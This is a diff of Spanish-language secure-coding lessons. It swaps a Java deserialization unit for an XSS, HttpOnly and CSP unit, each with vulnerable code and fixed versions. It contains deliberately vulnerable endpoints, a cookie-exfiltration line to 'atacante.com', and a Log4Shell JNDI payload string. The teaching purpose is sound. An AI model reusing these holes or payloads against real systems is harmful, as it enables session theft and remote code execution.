-        'email': 'test@test.com',
-        'created_at': '2024-01-15',
-        'is_admin': True,  # Campo no permitido
-    }, 400)
-
-    # Test 4: Tipo incorrecto
-    test("Tipo incorrecto en user_id", "/api/session/create", {
-        'username': 'test',
-        'user_id': 'abc',  # Deberia ser int
-        'role': 'user',
-        'email': 'test@test.com',
-        'created_at': '2024-01-15',
-    }, 400)
-
-    # Test 5: Verificar sesion con firma correcta
-    r = test("Crear sesion para verificar", "/api/session/create", {
-        'username': 'testuser',
-        'user_id': 456,
-        'role': 'viewer',
-        'email': 'viewer@example.com',
-        'created_at': '2024-06-01',
-    }, 200)
-
-    if r.status_code == 200:
-        data = r.json()
-        test("Verificar sesion con firma valida", "/api/session/verify", {
-            'token': data['token'],
-            'signature': data['signature'],
-        }, 200)
-
-        # Test 6: Verificar con firma invalida
-        test("Verificar sesion con firma invalida", "/api/session/verify", {
-            'token': data['token'],
-            'signature': 'firma_invalida',
-        }, 403)
+        <h2>4. javascript: URL (bloqueado):</h2>
+        <a href="javascript:alert('XSS - BLOQUEADO')">Link malicioso</a>
+        <p style="color:gray">Las URLs javascript: son bloqueadas</p>
+    </body>
+    </html>
+    """
+    response = make_response(render_template_string(template, nonce=nonce))
+    return response
 
 
 if __name__ == '__main__':
+    logging.basicConfig(level=logging.INFO)
     app.run(host='127.0.0.1', port=5000, debug=False)
 ```
 
+**Probar la proteccion CSP:**
+
+```bash
+python app_csp.py
+# Visitar http://127.0.0.1:5000/demo
+# Abrir la consola del navegador para ver los errores CSP
+```
+
 ---
 
-## Ejercicio 3: Deserializacion Segura en Java con Validacion
+## Ejercicio 2: App React Vulnerable - Identificar y Corregir XSS
 
 ### Escenario
 
-Dado codigo Java que usa ObjectInputStream para deserializar datos de usuario, escribir una version segura con validacion.
+Una aplicacion React tiene multiples vulnerabilidades XSS. Identificarlas y corregirlas.
 
-**Codigo vulnerable original:**
+**Version vulnerable (App.js):**
 
-```java
-// VulnerableServlet.java
-import java.io.*;
-import javax.servlet.*;
-import javax.servlet.http.*;
-import javax.json.*;
+```jsx
+import React, { useState, useEffect } from 'react';
 
-public class VulnerableServlet extends HttpServlet {
+function App() {
+    const [comentarios, setComentarios] = useState([]);
+    const [input, setInput] = useState('');
+    const [search, setSearch] = useState('');
 
-    protected void doPost(HttpServletRequest req, HttpServletResponse resp)
-            throws ServletException, IOException {
-
-        // Leer datos serializados del request
-        byte[] data = req.getInputStream().readAllBytes();
-
-        // VULNERABLE: Deserializa directamente sin validacion
-        try (ByteArrayInputStream bis = new ByteArrayInputStream(data);
-             ObjectInputStream ois = new ObjectInputStream(bis)) {
-
-            Object obj = ois.readObject();  // Puede ejecutar codigo arbitrario
-            resp.getWriter().println("Objeto deserializado: " + obj);
-
-        } catch (ClassNotFoundException e) {
-            resp.getWriter().println("Error: Clase no encontrada");
+    useEffect(() => {
+        // Vulnerabilidad 1: Leer hash de URL sin sanitizar
+        const hash = window.location.hash.substring(1);
+        if (hash) {
+            document.getElementById('hash-output').innerHTML = hash;
         }
-    }
-}
-```
+    }, []);
 
-**Version corregida con validacion:**
+    const agregarComentario = () => {
+        // Vulnerabilidad 2: Almacenar y renderizar sin sanitizar
+        const newComentarios = [...comentarios, input];
+        setComentarios(newComentarios);
+        // Tambien guardar en localStorage
+        localStorage.setItem('comentarios', JSON.stringify(newComentarios));
+    };
 
-```java
-// SafeDeserializationServlet.java
-import java.io.*;
-import java.security.*;
-import java.util.*;
-import javax.servlet.*;
-import javax.servlet.http.*;
-import com.google.gson.*;
+    // Vulnerabilidad 3: Renderizar busqueda sin escapar
+    const handleSearch = (e) => {
+        setSearch(e.target.value);
+    };
 
-public class SafeDeserializationServlet extends HttpServlet {
+    return (
+        <div>
+            <h1>App de Comentarios</h1>
 
-    // Lista blanca de clases permitidas para deserializar
-    private static final Set<String> ALLOWED_CLASSES = Set.of(
-        "java.lang.String",
-        "java.lang.Integer",
-        "java.lang.Long",
-        "java.lang.Boolean",
-        "java.lang.Double",
-        "java.util.ArrayList",
-        "java.util.HashMap",
-        "java.util.HashSet",
-        "com.miapp.model.Usuario",
-        "com.miapp.model.Sesion"
+            {/* MOSTRAR BUSQUEDA SIN ESCAPAR */}
+            <div>
+                <input type="text" onChange={handleSearch} placeholder="Buscar..." />
+                <p>Resultados para: <span id="search-result">{search}</span></p>
+            </div>
+
+            {/* FORMULARIO DE COMENTARIOS */}
+            <div>
+                <input
+                    type="text"
+                    value={input}
+                    onChange={(e) => setInput(e.target.value)}
+                />
+                <button onClick={agregarComentario}>Agregar</button>
+            </div>
+
+            {/* LISTAR COMENTARIOS SIN SANITIZAR */}
+            <ul>
+                {comentarios.map((c, i) => (
+                    <li key={i} dangerouslySetInnerHTML={{ __html: c }} />
+                ))}
+            </ul>
+
+            {/* OUTPUT DE HASH SIN SANITIZAR */}
+            <div id="hash-output"></div>
+        </div>
     );
-
-    // Clave secreta para verificar firmas
-    private static final String HMAC_KEY = System.getenv("SERIALIZATION_KEY");
-    static {
-        if (HMAC_KEY == null || HMAC_KEY.isEmpty()) {
-            throw new RuntimeException("SERIALIZATION_KEY no configurada");
-        }
-    }
-
-    @Override
-    protected void doPost(HttpServletRequest req, HttpServletResponse resp)
-            throws ServletException, IOException {
-
-        resp.setContentType("application/json");
-        PrintWriter out = resp.getWriter();
-
-        try {
-            // Opcion 1: Usar JSON en lugar de serializacion nativa
-            String jsonBody = new String(req.getInputStream().readAllBytes(), "UTF-8");
-            Gson gson = new Gson();
-
-            // Validar estructura basica
-            JsonObject json = JsonParser.parseString(jsonBody).getAsJsonObject();
-
-            // Validar campos requeridos
-            if (!json.has("type") || !json.has("data") || !json.has("signature")) {
-                out.println("{\"error\": \"Campos requeridos faltantes\"}");
-                resp.setStatus(400);
-                return;
-            }
-
-            String type = json.get("type").getAsString();
-            String data = json.get("data").toString();
-            String signature = json.get("signature").getAsString();
-
-            // Verificar firma
-            if (!verifyHMAC(data, signature)) {
-                out.println("{\"error\": \"Firma invalida\"}");
-                resp.setStatus(403);
-                return;
-            }
-
-            // Deserializar segun tipo
-            Object result;
-            switch (type) {
-                case "usuario":
-                    Usuario user = gson.fromJson(data, Usuario.class);
-                    result = user;
-                    break;
-                case "sesion":
-                    Sesion sesion = gson.fromJson(data, Sesion.class);
-                    result = sesion;
-                    break;
-                default:
-                    out.println("{\"error\": \"Tipo no soportado\"}");
-                    resp.setStatus(400);
-                    return;
-            }
-
-            out.println("{\"success\": true, \"data\": " + gson.toJson(result) + "}");
-
-        } catch (Exception e) {
-            out.println("{\"error\": \"Error deserializando datos\"}");
-            resp.setStatus(500);
-        }
-    }
-
-    /**
-     * Metodo seguro con ObjectInputStream + LookAheadObjectInputStream
-     * para cuando se debe usar serializacion nativa de Java
-     */
-    public static Object safeDeserialize(byte[] data) throws Exception {
-        try (ByteArrayInputStream bis = new ByteArrayInputStream(data);
-             LookAheadObjectInputStream laois = new LookAheadObjectInputStream(bis)) {
-
-            Object obj = laois.readObject();
-            return obj;
-        }
-    }
-
-    /**
-     * LookAheadObjectInputStream implementa lista blanca de clases
-     * para prevenir ataques de deserializacion con gadget chains
-     */
-    static class LookAheadObjectInputStream extends ObjectInputStream {
-
-        public LookAheadObjectInputStream(InputStream in) throws IOException {
-            super(in);
-            // Activar filtro de clases si disponible (Java 9+)
-            if (ObjectInputFilter.Config.getSerialFilter() == null) {
-                ObjectInputFilter filter = info -> {
-                    Class<?> clazz = info.serialClass();
-                    if (clazz != null) {
-                        if (ALLOWED_CLASSES.contains(clazz.getName())) {
-                            return ObjectInputFilter.Status.ALLOWED;
-                        }
-                        return ObjectInputFilter.Status.REJECTED;
-                    }
-                    return ObjectInputFilter.Status.UNDECIDED;
-                };
-                this.setObjectInputFilter(filter);
-            }
-        }
-
-        @Override
-        protected Class<?> resolveClass(ObjectStreamClass desc)
-                throws IOException, ClassNotFoundException {
-
-            String className = desc.getName();
-
-            // Verificar lista blanca antes de cargar la clase
-            if (!ALLOWED_CLASSES.contains(className)) {
-                throw new InvalidClassException(
-                    "Clase no permitida para deserializacion", className);
-            }
-
-            return super.resolveClass(desc);
-        }
-
-        @Override
-        protected Object resolveObject(Object obj) throws IOException {
-            // Validar el objeto despues de deserializar
-            if (obj != null) {
-                validateObject(obj);
-            }
-            return super.resolveObject(obj);
-        }
-
-        private void validateObject(Object obj) {
-            // Validaciones especificas por tipo
-            if (obj instanceof Usuario) {
-                Usuario user = (Usuario) obj;
-                if (user.getId() <= 0) {
-                    throw new SecurityException("ID de usuario invalido");
-                }
-                if (user.getRole() == null) {
-                    throw new SecurityException("Rol de usuario requerido");
-                }
-            }
-        }
-    }
-
-    private boolean verifyHMAC(String data, String signature) {
-        try {
-            Mac mac = Mac.getInstance("HmacSHA256");
-            SecretKeySpec keySpec = new SecretKeySpec(
-                HMAC_KEY.getBytes("UTF-8"), "HmacSHA256");
-            mac.init(keySpec);
-            byte[] expected = mac.doFinal(data.getBytes("UTF-8"));
-            String expectedHex = bytesToHex(expected);
-            return MessageDigest.isEqual(
-                expectedHex.getBytes(), signature.getBytes());
-        } catch (Exception e) {
-            return false;
-        }
-    }
-
-    private String bytesToHex(byte[] bytes) {
-        StringBuilder sb = new StringBuilder();
-        for (byte b : bytes) {
-            sb.append(String.format("%02x", b));
-        }
-        return sb.toString();
-    }
-
-    // Clases de ejemplo
-    static class Usuario implements Serializable {
-        private int id;
-        private String username;
-        private String role;
-
-        public int getId() { return id; }
-        public String getRole() { return role; }
-    }
-
-    static class Sesion implements Serializable {
-        private String sessionId;
-        private long expiresAt;
-        private int userId;
-    }
 }
+
+export default App;
 ```
 
-**Principios de seguridad aplicados:**
+**Version corregida (AppSegura.js):**
 
-1. **Usar JSON en vez de serializacion nativa de Java** cuando sea posible
-2. **Lista blanca de clases** en `resolveClass()` - solo clases conocidas
-3. **Validacion posterior** de los objetos deserializados
-4. **Firma HMAC** para verificar integridad y autenticidad
-5. **ObjectInputFilter** (Java 9+) para filtrado adicional
+```jsx
+import React, { useState, useEffect, useRef } from 'react';
+import DOMPurify from 'dompurify';
+
+function AppSegura() {
+    const [comentarios, setComentarios] = useState([]);
+    const [input, setInput] = useState('');
+    const [search, setSearch] = useState('');
+    const hashOutputRef = useRef(null);
+
+    useEffect(() => {
+        // CORREGIDO 1: Usar textContent en vez de innerHTML
+        const hash = window.location.hash.substring(1);
+        if (hash && hashOutputRef.current) {
+            hashOutputRef.current.textContent = hash;
+        }
+    }, []);
+
+    const agregarComentario = () => {
+        // CORREGIDO 2: Escapar o sanitizar antes de almacenar
+        const sanitized = DOMPurify.sanitize(input);
+        const newComentarios = [...comentarios, sanitized];
+        setComentarios(newComentarios);
+        localStorage.setItem('comentarios', JSON.stringify(newComentarios));
+    };
+
+    const handleSearch = (e) => {
+        // React escapa automaticamente en JSX, esto es seguro
+        setSearch(e.target.value);
+    };
+
+    return (
+        <div>
+            <h1>App de Comentarios (Segura)</h1>
+
+            {/* BUSQUEDA - React escapa por defecto en JSX */}
+            <div>
+                <input type="text" onChange={handleSearch} placeholder="Buscar..." />
+                {/* CORREGIDO: Usar {search} en vez de innerHTML */}
+                <p>Resultados para: <span>{search}</span></p>
+            </div>
+
+            {/* FORMULARIO */}
+            <div>
+                <input
+                    type="text"
+                    value={input}
+                    onChange={(e) => setInput(e.target.value)}
+                />
+                <button onClick={agregarComentario}>Agregar</button>
+            </div>
+
+            {/* CORREGIDO 3: No usar dangerouslySetInnerHTML con datos no confiables */}
+            <ul>
+                {comentarios.map((c, i) => (
+                    <li key={i}>{c}</li>  // React escapa automaticamente
+                ))}
+            </ul>
+
+            {/* CORREGIDO 4: Usar ref y textContent */}
+            <div ref={hashOutputRef}></div>
+        </div>
+    );
+}
+
+export default AppSegura;
+```
+
+---
+
+## Ejercicio 3: Simular Cookie Stealing y Demostrar HttpOnly
+
+### Escenario
+
+Simular un ataque de robo de cookies donde una cookie sin HttpOnly puede ser robada via XSS, y demostrar que una cookie con HttpOnly es segura.
+
+```python
+"""
+cookie_stealing_demo.py - Demostracion de HttpOnly vs no-HttpOnly
+"""
+from flask import Flask, request, jsonify, make_response
+import logging
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    """Pagina que establece dos tipos de cookies"""
+    response = make_response("""
+    <!DOCTYPE html>
+    <html>
+    <head><title>Demo HttpOnly</title></head>
+    <body>
+        <h1>Demostracion de HttpOnly Cookies</h1>
+        <p>Se han establecido 2 cookies:</p>
+        <ul>
+            <li><strong>session_insecure</strong>: Sin HttpOnly (accesible via JS)</li>
+            <li><strong>session_secure</strong>: Con HttpOnly (NO accesible via JS)</li>
+        </ul>
+
+        <h2>Prueba 1: Intentar leer cookies con JavaScript</h2>
+        <button onclick="testCookies()">Leer cookies</button>
+        <pre id="output"></pre>
+
+        <script>
+        function testCookies() {
+            var cookies = document.cookie;
+            document.getElementById('output').textContent =
+                'Cookies accesibles via JS: ' + (cookies || '(ninguna)');
+        }
+        </script>
+
+        <h2>Prueba 2: Simular ataque XSS (reflejado)</h2>
+        <form method="GET" action="/xss-test">
+            <input type="text" name="payload" placeholder="Ingrese payload XSS">
+            <input type="submit" value="Enviar">
+        </form>
+        <p>Ejemplo: <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+    </body>
+    </html>
+    """)
+
+    # Cookie SIN HttpOnly (vulnerable a XSS)
+    response.set_cookie(
+        'session_insecure',
+        value='este-es-mi-token-secreto-12345',
+        httponly=False,  # Accesible via JavaScript
+        secure=False,
+        samesite='Lax'
+    )
+
+    # Cookie CON HttpOnly (protegida contra XSS)
+    response.set_cookie(
+        'session_secure',
+        value='este-es-mi-token-ultra-seguro-67890',
+        httponly=True,  # NO accesible via JavaScript
+        secure=True,
+        samesite='Lax'
+    )
+
+    return response
+
+
+@app.route('/xss-test')
+def xss_test():
+    """Endpoint que refleja input - intencionalmente vulnerable para demostracion"""
+    payload = request.args.get('payload', '')
+    # No escapar intencionalmente para demostrar el ataque
+    return f"""
+    <!DOCTYPE html>
+    <html>
+    <body>
+        <h1>Resultado del payload XSS</h1>
+        <p>Ejecutando: {payload}</p>
+
+        <h2>Cookies accesibles:</h2>
+        <pre id="cookie-output"></pre>
+
+        <script>
+            // Si el atacante ejecuta: <script>fetch(...)</script>
+            // Esto solo puede robar session_insecure (no HttpOnly)
+            document.getElementById('cookie-output').textContent =
+                'Cookies: ' + (document.cookie || 'Ninguna cookie accesible');
+
+            // El atacante intentaria:
+            // fetch('https://atacante.com/steal?c=' + document.cookie)
+            // Pero solo obtiene session_insecure, NO session_secure
+        </script>
+
+        <p><strong>NOTA:</strong> La cookie <em>session_secure</em> con HttpOnly
+        NO aparece en document.cookie</p>
+        <a href="/">Volver</a>
+    </body>
+    </html>
+    """
+
+
+@app.route('/api/check-cookies')
+def check_cookies():
+    """API que muestra que cookies llegaron al servidor"""
+    cookies = dict(request.cookies)
+    app.logger.info(f"Cookies recibidas: {cookies}")
+    return jsonify({
+        'cookies_recibidas': cookies,
+        'mensaje': 'Ambas cookies se envian automaticamente en cada request HTTP'
+    })
+
+
+@app.route('/api/steal-test')
+def steal_test():
+    """Simula el endpoint del atacante"""
+    stolen = request.args.get('c', '')
+    if stolen:
+        app.logger.warning(f"COOKIE ROBADA (simulada): {stolen}")
+    return jsonify({'status': 'logged'})
+
+
+if __name__ == '__main__':
+    logging.basicConfig(level=logging.INFO)
+    app.run(host='127.0.0.1', port=5000)
+```
+
+**Explicacion del ejercicio:**
+
+1. Al visitar `/`, se establecen dos cookies: una sin HttpOnly y otra con HttpOnly
+2. `document.cookie` solo muestra la cookie sin HttpOnly
+3. Un ataque XSS solo puede robar la cookie sin HttpOnly
+4. La cookie con HttpOnly viaja en las requests HTTP pero es inaccesible via JavaScript
+5. Verificar con `/api/check-cookies` que ambas cookies llegan al servidor
+
+---
+
+## Ejercicio 4: Escribir Reglas CSP Explicando Cada Directiva
+
+### Escenario
+
+Dados los siguientes escenarios, escribir la politica CSP adecuada con explicacion de cada directiva.
+
+**Caso A: Sitio estatico sin recursos externos**
+
+```csp
+# Politica: Bloquear todo recurso externo
+Content-Security-Policy:
+    default-src 'self';       # Solo recursos del mismo origen
+    script-src 'self';         # Solo scripts propios
+    style-src 'self';          # Solo estilos propios
+    img-src 'self';            # Solo imagenes propias
+    font-src 'self';           # Solo tipografias propias
+    connect-src 'self';        # Solo conexiones al mismo origen
+    frame-ancestors 'none';    # No permitir iframes (protege clickjacking)
+    form-action 'self';        # Formularios solo al mismo origen
+    base-uri 'self';           # Base URI solo mismo origen
+    object-src 'none';         # Bloquear plugins (Flash, Java)
+```
+
+**Caso B: App que usa Google Analytics, Google Fonts y CDN de Bootstrap**
+
+```csp
+Content-Security-Policy:
+    default-src 'self';
+    script-src 'self'
+        https://www.googletagmanager.com   # Google Analytics/GTM
+        https://www.google-analytics.com   # Analytics.js
+        'nonce-{RANDOM}';                  # Scripts propios con nonce
+    style-src 'self'
+        https://fonts.googleapis.com        # Google Fonts styles
+        'unsafe-inline';                    # Permitir estilos inline (necesario)
+    img-src 'self'
+        https://www.google-analytics.com    # Analytics pixel
+        https://www.googletagmanager.com;   # GTM pixel
+    font-src 'self'
+        https://fonts.gstatic.com;          # Google Fonts files
+    connect-src 'self'
+        https://www.google-analytics.com;   # Analytics API
+    frame-ancestors 'none';
+    form-action 'self';
+    base-uri 'self';
+    object-src 'none';
+```
+
+**Caso C: App que necesita WebSockets y carga scripts de CDNs confiables**
+
+```csp
+Content-Security-Policy:
+    default-src 'none';                     # No permitir nada por defecto
+    script-src 'self'
+        https://cdnjs.cloudflare.com        # Scripts desde CDN
+        https://code.jquery.com             # jQuery desde CDN
+        'strict-dynamic'                    # Confiar en scripts cargados por scripts confiables
+        'nonce-{RANDOM}';                   # Scripts propios con nonce
+    style-src 'self'
+        'unsafe-inline';                    # Permitir estilos inline
+    img-src 'self' data: blob:;             # Imagenes propias, data: URIs, blobs
+    font-src 'self';                        # Tipografias propias
+    connect-src 'self'
+        wss://api.miapp.com                 # WebSocket seguro a API
+        https://api.miapp.com;              # API REST
+    frame-ancestors 'none';
+    form-action 'self';
+    base-uri 'self';
+    object-src 'none';
+    report-uri /csp-report;                 # Reportar violaciones para debugging
+```
+
+**Caso D: Migracion gradual (modo report-only)**
+
+```csp
+# Modo report-only: las violaciones se reportan pero NO se bloquean
+Content-Security-Policy-Report-Only:
+    default-src 'self';
+    script-src 'self' 'unsafe-inline' 'unsafe-eval';
+    style-src 'self' 'unsafe-inline';
+    img-src 'self' https: data:;
+    connect-src 'self' https:;
+    frame-ancestors 'none';
+    form-action 'self';
+    base-uri 'self';
+    object-src 'none';
+    report-uri /csp-report;
+```
 
 ---
 
 ## Preguntas y Respuestas
 
 ### Pregunta 1
-**Por que pickle es peligroso y cuando deberia usarse?**
+**Como funciona CSP nonce-based y por que es mas seguro que 'unsafe-inline'?**
 
-**Respuesta:** pickle es peligroso porque ejecuta codigo arbitrario durante la deserializacion. El metodo `__reduce__` permite especificar cualquier funcion y argumentos, por lo que `pickle.loads()` puede ejecutar `os.system()`, `subprocess.call()`, o cualquier otra funcion. Pickle solo deberia usarse cuando: (1) los datos provienen de una fuente completamente confiable (el mismo proceso), (2) los datos nunca son expuestos al exterior, (3) no hay posibilidad de que un atacante modifique los datos serializados. En cualquier otro caso, usar JSON, MessagePack, o Protocol Buffers.
+**Respuesta:** CSP nonce-based funciona generando un valor aleatorio (nonce) en cada request HTTP y agregandolo al header CSP como `script-src 'nonce-<valor>'`. Solo los tags `<script nonce="<valor>">` que tengan el nonce correcto se ejecutaran. El atacante no puede adivinar el nonce porque es generado aleatoriamente en el servidor para cada request. Es mas seguro que `'unsafe-inline'` porque este ultimo permite TODOS los scripts inline, incluidos los maliciosos. Con nonce, solo los scripts que el servidor marco explicitamente como confiables se ejecutan.
 
 ### Pregunta 2
-**Que son las gadget chains en Java deserialization?**
+**Que protege HttpOnly y que NO protege?**
 
-**Respuesta:** Las gadget chains son secuencias de clases disponibles en el classpath que, cuando se deserializan en orden, permiten ejecutar codigo arbitrario. Cada "gadget" es una clase que realiza una accion potencialmente peligrosa durante su deserializacion (como invocar un metodo, escribir un archivo, o establecer una propiedad). Al encadenar varios gadgets, el atacante puede lograr RCE. Ejemplos famosos: CommonsCollections1 (Apache Commons Collections), Spring PropertyPathFactoryBean, JDK7u21. La mitigacion principal es mantener las librerias actualizadas y usar listas blancas de clases.
+**Respuesta:** HttpOnly protege contra el robo de cookies via XSS, porque impide que JavaScript acceda a la cookie mediante `document.cookie`. Sin embargo, HttpOnly NO protege contra: (1) CSRF (la cookie se envia automaticamente en requests), (2) ataques de red (packet sniffing si no se usa Secure + HTTPS), (3) ataques de lado del servidor (si el atacante compromete el servidor, puede leer las cookies), (4) XSS que modifica la pagina en lugar de robar cookies (ej: un XSS que cambia el formulario de login para phishing). HttpOnly debe combinarse con Secure, SameSite y CSP.
 
 ### Pregunta 3
-**Cual es la relacion entre Log4Shell y deserializacion insegura?**
+**Cual es la diferencia entre CSP y X-XSS-Protection? Cual se recomienda actualmente?**
 
-**Respuesta:** Log4Shell (CVE-2021-44228) explota la funcionalidad de JNDI lookups en Log4j. Aunque no es deserializacion clasica, el atacante envia un payload como `${jndi:ldap://atacante.com/exploit}` que Log4j procesa. Log4j realiza una consulta LDAP a un servidor controlado por el atacante, que responde con una referencia a una clase Java. El cliente Log4j descarga y ejecuta esa clase, efectivamente ejecutando codigo arbitrario. Es una forma de deserializacion remota: datos no confiables (el payload en el log) desencadenan la carga y ejecucion de codigo desde una fuente externa.
+**Respuesta:** X-XSS-Protection era un filtro del navegador que intentaba detectar y bloquear XSS reflejado analizando las requests y respuestas. Fue eliminado de Chrome en 2019 porque tenia vulnerabilidades (podia ser evadido y en algunos casos introducia XSS). CSP es un mecanismo mucho mas completo y robusto que permite al servidor definir exactamente que recursos puede cargar la pagina. Se recomienda usar CSP en lugar de X-XSS-Protection. Ademas, CSP protege contra todos los tipos de XSS (reflejado, almacenado, DOM-based), no solo reflejado.
 
 ### Pregunta 4
-**Como se valida un esquema de deserializacion segura?**
+**Como funciona DOMPurify y cuando deberia usarse en lugar del escape automatico?**
 
-**Respuesta:** La validacion de esquema debe incluir: (1) **verificacion de tipo**: cada campo debe ser del tipo esperado (str, int, float, bool, list, dict), no aceptar tipos arbitrarios, (2) **verificacion de estructura**: los campos requeridos deben estar presentes y los campos adicionales deben ser rechazados, (3) **verificacion de valores**: rangos permitidos, valores permitidos (enum), longitudes maximas, (4) **verificacion de consistencia**: relaciones entre campos (ej: fecha_inicio < fecha_fin), (5) **firma digital**: HMAC o firma asimetrica para verificar que los datos no fueron manipulados. En Python, usar `jsonschema` o validacion manual. En Java, usar Bean Validation (JSR 380) con anotaciones.
+**Respuesta:** DOMPurify es una libreria de sanitizacion de HTML que elimina elementos peligrosos (scripts, event handlers, javascript: URLs, etc.) mientras preserva HTML seguro. Deberia usarse cuando necesitas permitir que los usuarios ingresen HTML con formato limitado (negritas, enlaces, listas) pero sin permitir scripts. El escape automatico (como `textContent` o la interpolacion de React) convierte todo en texto plano, lo cual es seguro pero pierde el formato. DOMPurify es un compromiso: permite HTML seguro y bloquea XSS. Siempre debe ejecutarse en el servidor, aunque puede usarse tambien en el cliente como capa adicional.
 
 ### Pregunta 5
-**Es seguro usar yaml.load() en Python? Cual es la alternativa?**
+**Es seguro usar dangerouslySetInnerHTML en React si sanitizas el contenido?**
 
-**Respuesta:** `yaml.load()` es INSEGURO porque puede ejecutar codigo arbitrario usando objetos Python personalizados. YAML permite definir tipos arbitrarios con tags `!!python/object:`, `!!python/name:`, `!!eval:`, etc. La alternativa segura es `yaml.safe_load()`, que solo acepta tipos YAML estandar (dict, list, str, int, float, bool, None). Si necesitas YAML completo (con tipos personalizados), debes implementar una lista blanca de constructores permitidos usando `yaml.add_constructor()`, similar a la lista blanca de clases en Java.
+**Respuesta:** Si, es seguro usar `dangerouslySetInnerHTML` si el contenido ha sido previamente sanitizado con una libreria como DOMPurify. Sin embargo, es mejor evitarlo siempre que sea posible. Las alternativas seguras son: (1) usar componentes de React en lugar de HTML strings (ej: convertir BBCode/Markdown a componentes React en lugar de a HTML), (2) usar `textContent` si no necesitas formato, (3) si necesitas renderizar HTML generado por el usuario, sanitizarlo con DOMPurify tanto en el cliente como en el servidor (defense in depth). El nombre `dangerouslySetInnerHTML` es intencional: React te obliga a reconocer explicitamente que estas haciendo algo peligroso.
 
 ### Pregunta 6
-**Cuales son las mitigaciones recomendadas por OWASP contra deserializacion insegura?**
+**Que directiva CSP bloquearia un iframe de atacante.com cargado en tu sitio?**
 
-**Respuesta:** OWASP recomienda: (1) **no aceptar datos serializados de fuentes no confiables** (la mitigacion mas efectiva), (2) **usar formatos de datos seguros** como JSON en lugar de pickle, Java serialization, o YAML, (3) **implementar listas blancas de clases** durante la deserializacion, (4) **firmar digitalmente** los datos serializados para verificar integridad, (5) **validar el esquema** de los datos despues de deserializar, (6) **deserializar en un entorno aislado** (sandbox, contenedor con minimos privilegios), (7) **monitorear y loggear** intentos de deserializacion sospechosos, (8) **mantener librerias actualizadas** para evitar gadget chains conocidas.
+**Respuesta:** La directiva `frame-src` controla que origenes pueden cargarse en iframes dentro de tu pagina. Para bloquear un iframe de `atacante.com`, usarias `frame-src 'self'` (solo iframes del mismo origen) o `frame-src 'none'` (ningun iframe permitido). Para prevenir que TU sitio se cargue en iframes de otros sitios (proteccion contra clickjacking), se usa `frame-ancestors 'none'` o `frame-ancestors 'self'`. Ambas directivas son complementarias: `frame-src` controla que cargas dentro de tu pagina, `frame-ancestors` controla donde se puede cargar tu pagina.
 
 ---
 
 ## Tarea / Lectura Recomendada
 
-1. **Leer:** OWASP Deserialization Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
-2. **Leer:** OWASP Java Deserialization - https://owasp.org/www-project-cheat-sheets/cheatsheets/Deserialization_Cheat_Sheet.html
-3. **Practicar:** PortSwigger Deserialization Labs - https://portswigger.net/web-security/deserialization
-4. **Experimentar:** Generar payloads pickle con diferentes comandos y probar contra la app vulnerable
-5. **Leer:** ysoserial - Herramienta para generar payloads de deserializacion Java: https://github.com/frohoff/ysoserial
-6. **Profundizar:** Investigar el ataque Log4Shell en detalle y sus mitigaciones
-7. **Leer:** Python pickle documentation - warnings about security: https://docs.python.org/3/library/pickle.html
+1. **Leer:** OWASP Content Security Policy Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
+2. **Leer:** MDN Web Docs - CSP: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+3. **Practicar:** CSP Evaluator de Google - https://csp-evaluator.withgoogle.com/ (analizar politicas CSP)
+4. **Experimentar:** Usar la app Flask del ejercicio 1 y probar diferentes politicas CSP
+5. **Leer:** DOMPurify documentation - https://github.com/cure53/DOMPurify
+6. **Profundizar:** Investigar "CSP bypass techniques" para entender como los atacantes evaden CSP
+7. **Practicar:** PortSwigger CSP labs - https://portswigger.net/web-security/cross-site-scripting/content-security-policy
+
 
 
